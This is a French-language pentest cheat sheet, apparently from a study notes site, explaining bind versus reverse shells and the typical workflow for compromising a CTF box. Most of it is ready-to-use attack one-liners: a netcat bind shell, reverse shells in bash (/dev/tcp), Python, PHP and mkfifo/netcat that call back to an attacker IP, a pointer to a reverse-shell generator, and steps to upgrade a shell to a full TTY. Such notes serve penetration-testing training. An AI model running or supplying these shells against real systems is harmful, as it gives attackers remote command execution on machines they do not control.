---
title: Shells — bind vs reverse
category: exploitation
icon: 🐚
difficulty: Essentiel
tags: [shells, reverse-shell, bind-shell, netcat, tty, revshells, rce]
summary: Différence bind/reverse, one-liners multi-langages, workflow d'une box, règle d'or du listener et stabilisation d'un shell dumb en TTY.
updated: 2026-09-25
source: cheatsheet
---

**Objectif pentest** : exécuter des commandes à distance sur la cible.

| | Bind shell | Reverse shell |
|---|---|---|
| Qui écoute ? | Cible | Attaquant |
| Qui se connecte ? | Attaquant | Cible |
| Sens connexion | Entrante chez cible | Sortante depuis cible |
| Marche derrière NAT ? | Non | **Oui** |
| Usage réel | Lab / CTF | **99% des cas** |

## Bind shell (rare en pratique)

```bash
# Sur cible (ouvre port 4444)
nc -lvnp 4444 -e /bin/bash

# Chez attaquant
nc IP_cible 4444
```

## Reverse shell (le standard)

```bash
# Chez attaquant (écoute)
nc -lvnp 4444

# Sur cible (déclenchée via RCE)
bash -i >& /dev/tcp/IP_attaquant/4444 0>&1
```

## Workflow type d'une box

1. `nmap` → ports/services
2. Enum → trouver vuln
3. Exploit → RCE (1 commande)
4. RCE déclenche reverse shell
5. Attaquant attrape avec `nc -lvnp`
6. Enum interne + privesc

## Variantes reverse shell (selon ce qui est dispo sur la cible)

```bash
# Bash
bash -i >& /dev/tcp/IP/PORT 0>&1

# Python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# PHP
php -r '$s=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Nc avec mkfifo
mkfifo /tmp/f;nc IP PORT </tmp/f|/bin/sh >/tmp/f 2>&1;rm /tmp/f

# Pour Windows : PowerShell reverse shell, voir Nishang ou revshells.com
```

Site indispensable : **revshells.com** (générateur tout fait).

> ⚠️ **Règle d'or** : listener UP **avant** de déclencher le payload, sinon connection refused.

## Stabiliser un shell dumb (upgrade to TTY)

À faire dès qu'on pop un reverse shell Linux :

```bash
# 1. Sur cible (dans le shell)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 2. Ctrl+Z (suspend)
# 3. Sur Kali
stty raw -echo; fg
# 4. Entrée, puis sur cible
export TERM=xterm
```

Résultat : tab completion + Ctrl+C annule la commande + historique flèches.
